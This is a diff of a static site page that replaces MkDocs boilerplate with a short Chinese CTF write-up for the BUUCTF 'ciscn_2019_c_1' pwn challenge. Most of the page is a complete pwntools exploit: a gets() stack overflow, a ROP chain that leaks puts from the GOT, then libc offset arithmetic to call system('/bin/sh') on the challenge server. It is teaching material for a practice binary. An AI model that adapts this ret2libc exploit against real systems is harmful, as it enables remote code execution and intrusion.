@@ -14,7 +14,7 @@
     
     
       
-        <title>MkDocs - Trick</title>
+        <title>Pwn buuctf ciscn 2019 c 1 - Trick</title>
       
     
     
@@ -61,7 +61,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#welcome-to-mkdocs" class="md-skip">
+        <a href="#libc64" class="md-skip">
           跳转至
         </a>
       
@@ -91,7 +91,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              MkDocs
+              Pwn buuctf ciscn 2019 c 1
             
           </span>
         </div>
@@ -371,56 +371,11 @@
       
       
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        MkDocs
-        <span class="md-nav__icon md-icon"></span>
-      </label>
-    
-    <a href="./" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../aboutMkdocs/" class="md-nav__link">
       MkDocs
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="目录">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      目录
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
     
@@ -438,8 +393,6 @@
 <nav class="md-nav md-nav--secondary" aria-label="目录">
   
   
-    
-  
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
@@ -448,15 +401,8 @@
     <ul class="md-nav__list" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    Commands
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#project-layout" class="md-nav__link">
-    Project layout
+  <a href="#libc64" class="md-nav__link">
+    libc64
   </a>
   
 </li>
@@ -474,21 +420,70 @@
               
                 
                 
-                <h1 id="welcome-to-mkdocs">Welcome to MkDocs</h1>
-<p>For full documentation visit <a href="http://mkdocs.org">mkdocs.org</a>.</p>
-<h2 id="commands">Commands</h2>
-<ul>
-<li><code>mkdocs new [dir-name]</code> - Create a new project.</li>
-<li><code>mkdocs serve</code> - Start the live-reloading docs server.</li>
-<li><code>mkdocs build</code> - Build the documentation site.</li>
-<li><code>mkdocs help</code> - Print this help message.</li>
-</ul>
-<h2 id="project-layout">Project layout</h2>
-<pre><code>mkdocs.yml    # The configuration file.
-docs/
-    index.md  # The documentation homepage.
-    ...       # Other markdown pages, images and other files.
+                  <h1>Pwn buuctf ciscn 2019 c 1</h1>
+                
+                <h3 id="libc64">libc64</h3>
+<p>ida查看</p>
+<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201120145605805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" />
+在main函数没有发现明显漏洞
+跟进encrypt()函数
+<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20201120145754897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lhbmdaaVRyaWNr,size_16,color_FFFFFF,t_70#pic_center" /></p>
+<p>发现了gets()和puts()函数，可以利用gets的栈溢出泄漏出puts的地址，从而找到libc版本信息getshell</p>
+<p>exp：</p>
+<pre><code class="language-python">from pwn import *
+from LibcSearcher import *
+p= remote('node3.buuoj.cn',25412)
+#p= remote('127.0.0.1',12345)
+#p = process('./ciscn_2019_c_1')
+#binsh_addr = 0x0804a028 # ROPgadget --binary level1  --string '/bin/sh'
+ret = 0x4006b9
+elf = ELF('./ciscn_2019_c_1')
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+main_addr = elf.symbols['main']
+pop_rdi = 0x400c83
+
+# def enc(string):
+#   newstr = list(string)
+#   for i in range(len(newstr)):
+#       c = ord(string[i])
+#       if c&lt;=96 or c&gt;122:
+#           if c&lt;64 or c&gt;90:
+#               if c&gt;47 and c&lt;=57:
+#                   c ^=0xF
+#               else:
+#                   c ^= 0xE
+#           else:
+#               c ^= 0xD
+#       newstr[i]=chr(c)
+#   return ''.join(newstr)
+
+#p.recv()
+p.sendline('1')
+p.recvuntil('encrypted')
+payload = 'a' * 0x58 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+p.sendline(payload)
+p.recvuntil('Ciphertext\n')
+#p.recvline()
+p.recvuntil('\n')
+puts_addr = u64(p.recv(6).ljust(8,b'\x00'))
+print(hex(puts_addr))
+
+
+#libc = LibcSearcher('puts', addr)
+libcbase = puts_addr - 0x0809c0 #libc.dump('puts')
+sys_addr = libcbase + 0x04f440  #libc.dump('system')
+bin_sh = libcbase + 0x1b3e9a    #libc.dump('str_bin_sh')
+
+p.recv()
+p.sendline('1')
+p.recvuntil('encrypted')
+payload = 'a'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
+p.sendline(payload)
+
+p.interactive()
 </code></pre>
+<p>也不知道为什么payload居然可以绕过了程序的加密？</p>
                 
               
               
@@ -503,27 +498,6 @@ docs/
       
         
 <footer class="md-footer">
-  
-    <div class="md-footer-nav">
-      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
-        
-          <a href="../friend/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
-            <div class="md-footer-nav__button md-icon">
-              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-            </div>
-            <div class="md-footer-nav__title">
-              <div class="md-ellipsis">
-                <span class="md-footer-nav__direction">
-                  上一页
-                </span>
-                友情链接
-              </div>
-            </div>
-          </a>
-        
-        
-      </nav>
-    </div>
   
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
